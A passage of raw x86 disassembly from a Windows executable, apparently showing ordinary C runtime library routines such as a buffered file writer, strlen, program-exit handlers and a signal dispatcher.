  403275:	85 c0                	test   %eax,%eax
  403277:	75 ca                	jne    0x403243
  403279:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40327c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40327f:	8b 01                	mov    (%ecx),%eax
  403281:	2b 42 08             	sub    0x8(%edx),%eax
  403284:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403287:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40328a:	8b 51 08             	mov    0x8(%ecx),%edx
  40328d:	83 c2 01             	add    $0x1,%edx
  403290:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403293:	89 10                	mov    %edx,(%eax)
  403295:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403298:	8b 51 18             	mov    0x18(%ecx),%edx
  40329b:	83 ea 01             	sub    $0x1,%edx
  40329e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4032a1:	89 50 04             	mov    %edx,0x4(%eax)
  4032a4:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4032a8:	7e 1c                	jle    0x4032c6
  4032aa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4032ad:	51                   	push   %ecx
  4032ae:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4032b1:	8b 42 08             	mov    0x8(%edx),%eax
  4032b4:	50                   	push   %eax
  4032b5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4032b8:	51                   	push   %ecx
  4032b9:	e8 42 48 00 00       	call   0x407b00
  4032be:	83 c4 0c             	add    $0xc,%esp
  4032c1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4032c4:	eb 46                	jmp    0x40330c
  4032c6:	83 7d f0 ff          	cmpl   $0xffffffff,-0x10(%ebp)
  4032ca:	74 1b                	je     0x4032e7
  4032cc:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4032cf:	c1 fa 05             	sar    $0x5,%edx
  4032d2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4032d5:	83 e0 1f             	and    $0x1f,%eax
  4032d8:	8b 0c 95 60 3a 42 00 	mov    0x423a60(,%edx,4),%ecx
  4032df:	8d 14 c1             	lea    (%ecx,%eax,8),%edx
  4032e2:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4032e5:	eb 07                	jmp    0x4032ee
  4032e7:	c7 45 ec 78 2d 42 00 	movl   $0x422d78,-0x14(%ebp)
  4032ee:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4032f1:	0f be 48 04          	movsbl 0x4(%eax),%ecx
  4032f5:	83 e1 20             	and    $0x20,%ecx
  4032f8:	85 c9                	test   %ecx,%ecx
  4032fa:	74 10                	je     0x40330c
  4032fc:	6a 02                	push   $0x2
  4032fe:	6a 00                	push   $0x0
  403300:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403303:	52                   	push   %edx
  403304:	e8 07 47 00 00       	call   0x407a10
  403309:	83 c4 0c             	add    $0xc,%esp
  40330c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40330f:	8b 48 08             	mov    0x8(%eax),%ecx
  403312:	8a 55 08             	mov    0x8(%ebp),%dl
  403315:	88 11                	mov    %dl,(%ecx)
  403317:	eb 1e                	jmp    0x403337
  403319:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403320:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403323:	50                   	push   %eax
  403324:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403327:	51                   	push   %ecx
  403328:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40332b:	52                   	push   %edx
  40332c:	e8 cf 47 00 00       	call   0x407b00
  403331:	83 c4 0c             	add    $0xc,%esp
  403334:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403337:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40333a:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40333d:	74 14                	je     0x403353
  40333f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403342:	8b 51 0c             	mov    0xc(%ecx),%edx
  403345:	83 ca 20             	or     $0x20,%edx
  403348:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40334b:	89 50 0c             	mov    %edx,0xc(%eax)
  40334e:	83 c8 ff             	or     $0xffffffff,%eax
  403351:	eb 08                	jmp    0x40335b
  403353:	8b 45 08             	mov    0x8(%ebp),%eax
  403356:	25 ff 00 00 00       	and    $0xff,%eax
  40335b:	5f                   	pop    %edi
  40335c:	5e                   	pop    %esi
  40335d:	5b                   	pop    %ebx
  40335e:	8b e5                	mov    %ebp,%esp
  403360:	5d                   	pop    %ebp
  403361:	c3                   	ret    
  403362:	cc                   	int3   
  403363:	cc                   	int3   
  403364:	cc                   	int3   
  403365:	cc                   	int3   
  403366:	cc                   	int3   
  403367:	cc                   	int3   
  403368:	cc                   	int3   
  403369:	cc                   	int3   
  40336a:	cc                   	int3   
  40336b:	cc                   	int3   
  40336c:	cc                   	int3   
  40336d:	cc                   	int3   
  40336e:	cc                   	int3   
  40336f:	cc                   	int3   
  403370:	55                   	push   %ebp
  403371:	8b ec                	mov    %esp,%ebp
  403373:	83 ec 28             	sub    $0x28,%esp
  403376:	8b 45 08             	mov    0x8(%ebp),%eax
  403379:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40337c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40337f:	0f af 4d 10          	imul   0x10(%ebp),%ecx
  403383:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403386:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403389:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40338c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  403390:	75 07                	jne    0x403399
  403392:	33 c0                	xor    %eax,%eax
  403394:	e9 ec 01 00 00       	jmp    0x403585
  403399:	8b 45 14             	mov    0x14(%ebp),%eax
  40339c:	8b 48 0c             	mov    0xc(%eax),%ecx
  40339f:	81 e1 0c 01 00 00    	and    $0x10c,%ecx
  4033a5:	85 c9                	test   %ecx,%ecx
  4033a7:	74 0b                	je     0x4033b4
  4033a9:	8b 55 14             	mov    0x14(%ebp),%edx
  4033ac:	8b 42 18             	mov    0x18(%edx),%eax
  4033af:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4033b2:	eb 07                	jmp    0x4033bb
  4033b4:	c7 45 e4 00 10 00 00 	movl   $0x1000,-0x1c(%ebp)
  4033bb:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4033bf:	0f 84 bd 01 00 00    	je     0x403582
  4033c5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4033c8:	8b 51 0c             	mov    0xc(%ecx),%edx
  4033cb:	81 e2 08 01 00 00    	and    $0x108,%edx
  4033d1:	85 d2                	test   %edx,%edx
  4033d3:	74 74                	je     0x403449
  4033d5:	8b 45 14             	mov    0x14(%ebp),%eax
  4033d8:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4033dc:	74 6b                	je     0x403449
  4033de:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4033e1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4033e4:	3b 51 04             	cmp    0x4(%ecx),%edx
  4033e7:	73 08                	jae    0x4033f1
  4033e9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4033ec:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4033ef:	eb 09                	jmp    0x4033fa
  4033f1:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4033f4:	8b 51 04             	mov    0x4(%ecx),%edx
  4033f7:	89 55 e0             	mov    %edx,-0x20(%ebp)
  4033fa:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4033fd:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403400:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403403:	51                   	push   %ecx
  403404:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403407:	52                   	push   %edx
  403408:	8b 45 14             	mov    0x14(%ebp),%eax
  40340b:	8b 08                	mov    (%eax),%ecx
  40340d:	51                   	push   %ecx
  40340e:	e8 6d 4a 00 00       	call   0x407e80
  403413:	83 c4 0c             	add    $0xc,%esp
  403416:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403419:	2b 55 e8             	sub    -0x18(%ebp),%edx
  40341c:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40341f:	8b 45 14             	mov    0x14(%ebp),%eax
  403422:	8b 48 04             	mov    0x4(%eax),%ecx
  403425:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  403428:	8b 55 14             	mov    0x14(%ebp),%edx
  40342b:	89 4a 04             	mov    %ecx,0x4(%edx)
  40342e:	8b 45 14             	mov    0x14(%ebp),%eax
  403431:	8b 08                	mov    (%eax),%ecx
  403433:	03 4d e8             	add    -0x18(%ebp),%ecx
  403436:	8b 55 14             	mov    0x14(%ebp),%edx
  403439:	89 0a                	mov    %ecx,(%edx)
  40343b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40343e:	03 45 e8             	add    -0x18(%ebp),%eax
  403441:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403444:	e9 34 01 00 00       	jmp    0x40357d
  403449:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40344c:	3b 4d e4             	cmp    -0x1c(%ebp),%ecx
  40344f:	0f 82 ca 00 00 00    	jb     0x40351f
  403455:	8b 55 14             	mov    0x14(%ebp),%edx
  403458:	8b 42 0c             	mov    0xc(%edx),%eax
  40345b:	25 08 01 00 00       	and    $0x108,%eax
  403460:	85 c0                	test   %eax,%eax
  403462:	74 20                	je     0x403484
  403464:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403467:	51                   	push   %ecx
  403468:	e8 b3 35 00 00       	call   0x406a20
  40346d:	83 c4 04             	add    $0x4,%esp
  403470:	85 c0                	test   %eax,%eax
  403472:	74 10                	je     0x403484
  403474:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403477:	2b 45 f4             	sub    -0xc(%ebp),%eax
  40347a:	33 d2                	xor    %edx,%edx
  40347c:	f7 75 0c             	divl   0xc(%ebp)
  40347f:	e9 01 01 00 00       	jmp    0x403585
  403484:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  403488:	74 12                	je     0x40349c
  40348a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40348d:	33 d2                	xor    %edx,%edx
  40348f:	f7 75 e4             	divl   -0x1c(%ebp)
  403492:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403495:	2b c2                	sub    %edx,%eax
  403497:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40349a:	eb 06                	jmp    0x4034a2
  40349c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40349f:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4034a2:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4034a5:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4034a8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4034ab:	50                   	push   %eax
  4034ac:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4034af:	51                   	push   %ecx
  4034b0:	8b 55 14             	mov    0x14(%ebp),%edx
  4034b3:	8b 42 10             	mov    0x10(%edx),%eax
  4034b6:	50                   	push   %eax
  4034b7:	e8 44 46 00 00       	call   0x407b00
  4034bc:	83 c4 0c             	add    $0xc,%esp
  4034bf:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4034c2:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  4034c6:	75 1f                	jne    0x4034e7
  4034c8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4034cb:	8b 51 0c             	mov    0xc(%ecx),%edx
  4034ce:	83 ca 20             	or     $0x20,%edx
  4034d1:	8b 45 14             	mov    0x14(%ebp),%eax
  4034d4:	89 50 0c             	mov    %edx,0xc(%eax)
  4034d7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4034da:	2b 45 f4             	sub    -0xc(%ebp),%eax
  4034dd:	33 d2                	xor    %edx,%edx
  4034df:	f7 75 0c             	divl   0xc(%ebp)
  4034e2:	e9 9e 00 00 00       	jmp    0x403585
  4034e7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4034ea:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  4034ed:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4034f0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4034f3:	03 55 ec             	add    -0x14(%ebp),%edx
  4034f6:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4034f9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4034fc:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  4034ff:	73 1c                	jae    0x40351d
  403501:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403504:	8b 51 0c             	mov    0xc(%ecx),%edx
  403507:	83 ca 20             	or     $0x20,%edx
  40350a:	8b 45 14             	mov    0x14(%ebp),%eax
  40350d:	89 50 0c             	mov    %edx,0xc(%eax)
  403510:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403513:	2b 45 f4             	sub    -0xc(%ebp),%eax
  403516:	33 d2                	xor    %edx,%edx
  403518:	f7 75 0c             	divl   0xc(%ebp)
  40351b:	eb 68                	jmp    0x403585
  40351d:	eb 5e                	jmp    0x40357d
  40351f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403522:	0f be 11             	movsbl (%ecx),%edx
  403525:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403528:	8b 45 14             	mov    0x14(%ebp),%eax
  40352b:	50                   	push   %eax
  40352c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40352f:	51                   	push   %ecx
  403530:	e8 bb fb ff ff       	call   0x4030f0
  403535:	83 c4 08             	add    $0x8,%esp
  403538:	83 f8 ff             	cmp    $0xffffffff,%eax
  40353b:	75 0d                	jne    0x40354a
  40353d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403540:	2b 45 f4             	sub    -0xc(%ebp),%eax
  403543:	33 d2                	xor    %edx,%edx
  403545:	f7 75 0c             	divl   0xc(%ebp)
  403548:	eb 3b                	jmp    0x403585
  40354a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40354d:	83 c2 01             	add    $0x1,%edx
  403550:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403553:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403556:	83 e8 01             	sub    $0x1,%eax
  403559:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40355c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40355f:	83 79 18 00          	cmpl   $0x0,0x18(%ecx)
  403563:	7e 0b                	jle    0x403570
  403565:	8b 55 14             	mov    0x14(%ebp),%edx
  403568:	8b 42 18             	mov    0x18(%edx),%eax
  40356b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40356e:	eb 07                	jmp    0x403577
  403570:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  403577:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40357a:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40357d:	e9 39 fe ff ff       	jmp    0x4033bb
  403582:	8b 45 10             	mov    0x10(%ebp),%eax
  403585:	8b e5                	mov    %ebp,%esp
  403587:	5d                   	pop    %ebp
  403588:	c3                   	ret    
  403589:	cc                   	int3   
  40358a:	cc                   	int3   
  40358b:	cc                   	int3   
  40358c:	cc                   	int3   
  40358d:	cc                   	int3   
  40358e:	cc                   	int3   
  40358f:	cc                   	int3   
  403590:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403594:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40359a:	74 14                	je     0x4035b0
  40359c:	8a 01                	mov    (%ecx),%al
  40359e:	41                   	inc    %ecx
  40359f:	84 c0                	test   %al,%al
  4035a1:	74 40                	je     0x4035e3
  4035a3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4035a9:	75 f1                	jne    0x40359c
  4035ab:	05 00 00 00 00       	add    $0x0,%eax
  4035b0:	8b 01                	mov    (%ecx),%eax
  4035b2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4035b7:	03 d0                	add    %eax,%edx
  4035b9:	83 f0 ff             	xor    $0xffffffff,%eax
  4035bc:	33 c2                	xor    %edx,%eax
  4035be:	83 c1 04             	add    $0x4,%ecx
  4035c1:	a9 00 01 01 81       	test   $0x81010100,%eax
  4035c6:	74 e8                	je     0x4035b0
  4035c8:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4035cb:	84 c0                	test   %al,%al
  4035cd:	74 32                	je     0x403601
  4035cf:	84 e4                	test   %ah,%ah
  4035d1:	74 24                	je     0x4035f7
  4035d3:	a9 00 00 ff 00       	test   $0xff0000,%eax
  4035d8:	74 13                	je     0x4035ed
  4035da:	a9 00 00 00 ff       	test   $0xff000000,%eax
  4035df:	74 02                	je     0x4035e3
  4035e1:	eb cd                	jmp    0x4035b0
  4035e3:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4035e6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4035ea:	2b c1                	sub    %ecx,%eax
  4035ec:	c3                   	ret    
  4035ed:	8d 41 fe             	lea    -0x2(%ecx),%eax
  4035f0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4035f4:	2b c1                	sub    %ecx,%eax
  4035f6:	c3                   	ret    
  4035f7:	8d 41 fd             	lea    -0x3(%ecx),%eax
  4035fa:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4035fe:	2b c1                	sub    %ecx,%eax
  403600:	c3                   	ret    
  403601:	8d 41 fc             	lea    -0x4(%ecx),%eax
  403604:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403608:	2b c1                	sub    %ecx,%eax
  40360a:	c3                   	ret    
  40360b:	cc                   	int3   
  40360c:	cc                   	int3   
  40360d:	cc                   	int3   
  40360e:	cc                   	int3   
  40360f:	cc                   	int3   
  403610:	55                   	push   %ebp
  403611:	8b ec                	mov    %esp,%ebp
  403613:	83 3d bc 3b 42 00 00 	cmpl   $0x0,0x423bbc
  40361a:	74 06                	je     0x403622
  40361c:	ff 15 bc 3b 42 00    	call   *0x423bbc
  403622:	68 18 24 42 00       	push   $0x422418
  403627:	68 08 22 42 00       	push   $0x422208
  40362c:	e8 7f 01 00 00       	call   0x4037b0
  403631:	83 c4 08             	add    $0x8,%esp
  403634:	68 04 21 42 00       	push   $0x422104
  403639:	68 00 20 42 00       	push   $0x422000
  40363e:	e8 6d 01 00 00       	call   0x4037b0
  403643:	83 c4 08             	add    $0x8,%esp
  403646:	5d                   	pop    %ebp
  403647:	c3                   	ret    
  403648:	cc                   	int3   
  403649:	cc                   	int3   
  40364a:	cc                   	int3   
  40364b:	cc                   	int3   
  40364c:	cc                   	int3   
  40364d:	cc                   	int3   
  40364e:	cc                   	int3   
  40364f:	cc                   	int3   
  403650:	55                   	push   %ebp
  403651:	8b ec                	mov    %esp,%ebp
  403653:	6a 00                	push   $0x0
  403655:	6a 00                	push   $0x0
  403657:	8b 45 08             	mov    0x8(%ebp),%eax
  40365a:	50                   	push   %eax
  40365b:	e8 70 00 00 00       	call   0x4036d0
  403660:	83 c4 0c             	add    $0xc,%esp
  403663:	5d                   	pop    %ebp
  403664:	c3                   	ret    
  403665:	cc                   	int3   
  403666:	cc                   	int3   
  403667:	cc                   	int3   
  403668:	cc                   	int3   
  403669:	cc                   	int3   
  40366a:	cc                   	int3   
  40366b:	cc                   	int3   
  40366c:	cc                   	int3   
  40366d:	cc                   	int3   
  40366e:	cc                   	int3   
  40366f:	cc                   	int3   
  403670:	55                   	push   %ebp
  403671:	8b ec                	mov    %esp,%ebp
  403673:	6a 00                	push   $0x0
  403675:	6a 01                	push   $0x1
  403677:	8b 45 08             	mov    0x8(%ebp),%eax
  40367a:	50                   	push   %eax
  40367b:	e8 50 00 00 00       	call   0x4036d0
  403680:	83 c4 0c             	add    $0xc,%esp
  403683:	5d                   	pop    %ebp
  403684:	c3                   	ret    
  403685:	cc                   	int3   
  403686:	cc                   	int3   
  403687:	cc                   	int3   
  403688:	cc                   	int3   
  403689:	cc                   	int3   
  40368a:	cc                   	int3   
  40368b:	cc                   	int3   
  40368c:	cc                   	int3   
  40368d:	cc                   	int3   
  40368e:	cc                   	int3   
  40368f:	cc                   	int3   
  403690:	55                   	push   %ebp
  403691:	8b ec                	mov    %esp,%ebp
  403693:	6a 01                	push   $0x1
  403695:	6a 00                	push   $0x0
  403697:	6a 00                	push   $0x0
  403699:	e8 32 00 00 00       	call   0x4036d0
  40369e:	83 c4 0c             	add    $0xc,%esp
  4036a1:	5d                   	pop    %ebp
  4036a2:	c3                   	ret    
  4036a3:	cc                   	int3   
  4036a4:	cc                   	int3   
  4036a5:	cc                   	int3   
  4036a6:	cc                   	int3   
  4036a7:	cc                   	int3   
  4036a8:	cc                   	int3   
  4036a9:	cc                   	int3   
  4036aa:	cc                   	int3   
  4036ab:	cc                   	int3   
  4036ac:	cc                   	int3   
  4036ad:	cc                   	int3   
  4036ae:	cc                   	int3   
  4036af:	cc                   	int3   
  4036b0:	55                   	push   %ebp
  4036b1:	8b ec                	mov    %esp,%ebp
  4036b3:	6a 01                	push   $0x1
  4036b5:	6a 01                	push   $0x1
  4036b7:	6a 00                	push   $0x0
  4036b9:	e8 12 00 00 00       	call   0x4036d0
  4036be:	83 c4 0c             	add    $0xc,%esp
  4036c1:	5d                   	pop    %ebp
  4036c2:	c3                   	ret    
  4036c3:	cc                   	int3   
  4036c4:	cc                   	int3   
  4036c5:	cc                   	int3   
  4036c6:	cc                   	int3   
  4036c7:	cc                   	int3   
  4036c8:	cc                   	int3   
  4036c9:	cc                   	int3   
  4036ca:	cc                   	int3   
  4036cb:	cc                   	int3   
  4036cc:	cc                   	int3   
  4036cd:	cc                   	int3   
  4036ce:	cc                   	int3   
  4036cf:	cc                   	int3   
  4036d0:	55                   	push   %ebp
  4036d1:	8b ec                	mov    %esp,%ebp
  4036d3:	51                   	push   %ecx
  4036d4:	83 3d 14 36 42 00 01 	cmpl   $0x1,0x423614
  4036db:	75 11                	jne    0x4036ee
  4036dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4036e0:	50                   	push   %eax
  4036e1:	ff 15 c0 51 42 00    	call   *0x4251c0
  4036e7:	50                   	push   %eax
  4036e8:	ff 15 bc 51 42 00    	call   *0x4251bc
  4036ee:	c7 05 10 36 42 00 01 	movl   $0x1,0x423610
  4036f5:	00 00 00 
  4036f8:	8a 4d 10             	mov    0x10(%ebp),%cl
  4036fb:	88 0d 0c 36 42 00    	mov    %cl,0x42360c
  403701:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  403705:	75 47                	jne    0x40374e
  403707:	83 3d b8 3b 42 00 00 	cmpl   $0x0,0x423bb8
  40370e:	74 2c                	je     0x40373c
  403710:	8b 15 b4 3b 42 00    	mov    0x423bb4,%edx
  403716:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403719:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40371c:	83 e8 04             	sub    $0x4,%eax
  40371f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403722:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403725:	3b 0d b8 3b 42 00    	cmp    0x423bb8,%ecx
  40372b:	72 0f                	jb     0x40373c
  40372d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403730:	83 3a 00             	cmpl   $0x0,(%edx)
  403733:	74 05                	je     0x40373a
  403735:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403738:	ff 10                	call   *(%eax)
  40373a:	eb dd                	jmp    0x403719
  40373c:	68 24 27 42 00       	push   $0x422724
  403741:	68 1c 25 42 00       	push   $0x42251c
  403746:	e8 65 00 00 00       	call   0x4037b0
  40374b:	83 c4 08             	add    $0x8,%esp
  40374e:	68 2c 29 42 00       	push   $0x42292c
  403753:	68 28 28 42 00       	push   $0x422828
  403758:	e8 53 00 00 00       	call   0x4037b0
  40375d:	83 c4 08             	add    $0x8,%esp
  403760:	83 3d 18 36 42 00 00 	cmpl   $0x0,0x423618
  403767:	75 20                	jne    0x403789
  403769:	6a ff                	push   $0xffffffff
  40376b:	e8 10 28 00 00       	call   0x405f80
  403770:	83 c4 04             	add    $0x4,%esp
  403773:	83 e0 20             	and    $0x20,%eax
  403776:	85 c0                	test   %eax,%eax
  403778:	74 0f                	je     0x403789
  40377a:	c7 05 18 36 42 00 01 	movl   $0x1,0x423618
  403781:	00 00 00 
  403784:	e8 b7 30 00 00       	call   0x406840
  403789:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40378d:	74 02                	je     0x403791
  40378f:	eb 14                	jmp    0x4037a5
  403791:	c7 05 14 36 42 00 01 	movl   $0x1,0x423614
  403798:	00 00 00 
  40379b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40379e:	51                   	push   %ecx
  40379f:	ff 15 94 51 42 00    	call   *0x425194
  4037a5:	8b e5                	mov    %ebp,%esp
  4037a7:	5d                   	pop    %ebp
  4037a8:	c3                   	ret    
  4037a9:	cc                   	int3   
  4037aa:	cc                   	int3   
  4037ab:	cc                   	int3   
  4037ac:	cc                   	int3   
  4037ad:	cc                   	int3   
  4037ae:	cc                   	int3   
  4037af:	cc                   	int3   
  4037b0:	55                   	push   %ebp
  4037b1:	8b ec                	mov    %esp,%ebp
  4037b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4037b6:	3b 45 0c             	cmp    0xc(%ebp),%eax
  4037b9:	73 18                	jae    0x4037d3
  4037bb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4037be:	83 39 00             	cmpl   $0x0,(%ecx)
  4037c1:	74 05                	je     0x4037c8
  4037c3:	8b 55 08             	mov    0x8(%ebp),%edx
  4037c6:	ff 12                	call   *(%edx)
  4037c8:	8b 45 08             	mov    0x8(%ebp),%eax
  4037cb:	83 c0 04             	add    $0x4,%eax
  4037ce:	89 45 08             	mov    %eax,0x8(%ebp)
  4037d1:	eb e0                	jmp    0x4037b3
  4037d3:	5d                   	pop    %ebp
  4037d4:	c3                   	ret    
  4037d5:	cc                   	int3   
  4037d6:	cc                   	int3   
  4037d7:	cc                   	int3   
  4037d8:	cc                   	int3   
  4037d9:	cc                   	int3   
  4037da:	cc                   	int3   
  4037db:	cc                   	int3   
  4037dc:	cc                   	int3   
  4037dd:	cc                   	int3   
  4037de:	cc                   	int3   
  4037df:	cc                   	int3   
  4037e0:	55                   	push   %ebp
  4037e1:	8b ec                	mov    %esp,%ebp
  4037e3:	83 ec 14             	sub    $0x14,%esp
  4037e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4037e9:	50                   	push   %eax
  4037ea:	e8 a1 01 00 00       	call   0x403990
  4037ef:	83 c4 04             	add    $0x4,%esp
  4037f2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4037f5:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4037f9:	74 09                	je     0x403804
  4037fb:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4037fe:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  403802:	75 0f                	jne    0x403813
  403804:	8b 55 0c             	mov    0xc(%ebp),%edx
  403807:	52                   	push   %edx
  403808:	ff 15 c4 51 42 00    	call   *0x4251c4
  40380e:	e9 72 01 00 00       	jmp    0x403985
  403813:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403816:	83 78 08 05          	cmpl   $0x5,0x8(%eax)
  40381a:	75 14                	jne    0x403830
  40381c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40381f:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  403826:	b8 01 00 00 00       	mov    $0x1,%eax
  40382b:	e9 55 01 00 00       	jmp    0x403985
  403830:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403833:	83 7a 08 01          	cmpl   $0x1,0x8(%edx)
  403837:	75 08                	jne    0x403841
  403839:	83 c8 ff             	or     $0xffffffff,%eax
  40383c:	e9 44 01 00 00       	jmp    0x403985
  403841:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403844:	8b 48 08             	mov    0x8(%eax),%ecx
  403847:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40384a:	8b 15 1c 36 42 00    	mov    0x42361c,%edx
  403850:	89 55 ec             	mov    %edx,-0x14(%ebp)
  403853:	8b 45 0c             	mov    0xc(%ebp),%eax
  403856:	a3 1c 36 42 00       	mov    %eax,0x42361c
  40385b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40385e:	83 79 04 08          	cmpl   $0x8,0x4(%ecx)
  403862:	0f 85 fa 00 00 00    	jne    0x403962
  403868:	8b 15 68 2d 42 00    	mov    0x422d68,%edx
  40386e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  403871:	eb 09                	jmp    0x40387c
  403873:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403876:	83 c0 01             	add    $0x1,%eax
  403879:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40387c:	8b 0d 68 2d 42 00    	mov    0x422d68,%ecx
  403882:	03 0d 6c 2d 42 00    	add    0x422d6c,%ecx
  403888:	39 4d f0             	cmp    %ecx,-0x10(%ebp)
  40388b:	7d 12                	jge    0x40389f
  40388d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403890:	6b d2 0c             	imul   $0xc,%edx,%edx
  403893:	c7 82 f8 2c 42 00 00 	movl   $0x0,0x422cf8(%edx)
  40389a:	00 00 00 
  40389d:	eb d4                	jmp    0x403873
  40389f:	a1 74 2d 42 00       	mov    0x422d74,%eax
  4038a4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4038a7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
